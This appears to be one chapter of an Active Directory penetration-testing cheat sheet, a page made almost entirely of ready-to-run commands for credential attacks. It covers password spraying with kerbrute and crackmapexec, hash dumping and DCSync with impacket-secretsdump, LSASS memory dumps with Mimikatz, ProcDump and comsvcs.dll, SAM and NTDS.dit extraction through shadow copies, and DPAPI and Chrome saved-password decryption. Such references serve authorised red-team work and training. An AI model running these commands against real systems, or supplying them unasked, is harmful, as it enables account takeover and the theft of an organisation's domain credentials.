# 04 — Password Attacks & Credential Abuse

[← Back to index](README.md)

## 4.1 Password Spraying

```bash
# CRITICAL: Check lockout policy FIRST
crackmapexec smb $DC_IP -u $USER -p $PASS --pass-pol
# Look for: Account Lockout Threshold, Observation Window

# Kerbrute spray (Kerberos — generates less LDAP noise)
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123!'
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Summer2024!' --delay 30

# CME spray (SMB)
crackmapexec smb $DC_IP -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce   # 1:1 user:pass

# CME spray (WinRM)
crackmapexec winrm 10.10.10.0/24 -u users.txt -p 'Password123!'

# Generate season-based wordlist
for year in 2023 2024; do for s in Spring Summer Fall Winter; do echo "${s}${year}!"; done; done > seasonal.txt

# Check for common pattern passwords
# CompanyName + Year + Special: Corp2024!, Corp2024#
# Seasonal: Summer2024!, Winter2023@
```

## 4.2 Hash Dumping

### Secretsdump (Impacket) — Remote Hash Extraction

```bash
# Dump all hashes from remote system (requires admin)
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET_IP
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP

# Using NTLM hash
impacket-secretsdump $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH'

# DCSync (dump all domain hashes — requires DA or DCSync rights)
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-ntlm
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user krbtgt
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user Administrator

# Save to file
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc -outputfile domain_hashes

# Crack with hashcat
hashcat -m 1000 domain_hashes.ntds /usr/share/wordlists/rockyou.txt   # NTLM hashes
```

### Mimikatz — Local Credential Extraction

```powershell
# Dump credentials from LSASS memory
.\Mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit

# NTLM hashes only
.\Mimikatz.exe 'privilege::debug' 'sekurlsa::msv' exit

# Kerberos tickets
.\Mimikatz.exe 'privilege::debug' 'sekurlsa::tickets /export' exit

# DPAPI credentials
.\Mimikatz.exe 'privilege::debug' 'sekurlsa::dpapi' exit

# Dump SAM (local accounts)
.\Mimikatz.exe 'privilege::debug' 'lsadump::sam' exit

# DCSync (requires DA)
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:Administrator' exit
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /all /csv' exit
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' exit
```

### LSASS Dump — Memory Acquisition

```powershell
# Task Manager method (requires local admin — GUI)
# Task Manager -> Details -> lsass.exe -> right click -> Create dump file

# ProcDump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp

# Comsvcs.dll (LOLBin — built-in Windows)
tasklist | findstr lsass
rundll32 C:\Windows\System32\comsvcs.dll MiniDump LSASS_PID lsass.dmp full
```

```bash
# CrackMapExec LSASS dump
crackmapexec smb $TARGET_IP -u $USER -p $PASS -M lsassy
crackmapexec smb $TARGET_IP -u $USER -p $PASS -M nanodump

# Parse LSASS dump offline (Pypykatz)
pip3 install pypykatz --break-system-packages
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp | grep NT:
```

```powershell
# Parse with Mimikatz offline
.\Mimikatz.exe 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords' exit
```

### SAM & LSA Secret Extraction

```powershell
# Dump SAM locally (requires SYSTEM)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

```bash
# Parse offline
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

```powershell
# Volume Shadow Copy (bypass file locks)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

```bash
# Parse NTDS.dit
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL -just-dc-ntlm
```

## 4.3 DPAPI & Credential Manager

```powershell
# List DPAPI master keys
dir %APPDATA%\Microsoft\Protect\

# List stored credentials
cmdkey /list
dir C:\Users\$USER\AppData\Local\Microsoft\Credentials\

# Decrypt with Mimikatz
.\Mimikatz.exe 'dpapi::cred /in:C:\Users\$USER\AppData\Local\Microsoft\Credentials\CRED_FILE' exit
.\Mimikatz.exe 'dpapi::masterkey /in:MASTERKEY_FILE /rpc' exit

# Full DPAPI dump
.\Mimikatz.exe 'sekurlsa::dpapi' exit

# Browser credentials (Chrome)
.\Mimikatz.exe 'dpapi::chrome /in:%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data /unprotect' exit
```

---

[← Prev: 03 — Kerberos Attacks](03-kerberos-attacks.md) | [Next: 05 — Kerberos Delegation Attacks →](05-kerberos-delegation-attacks.md)
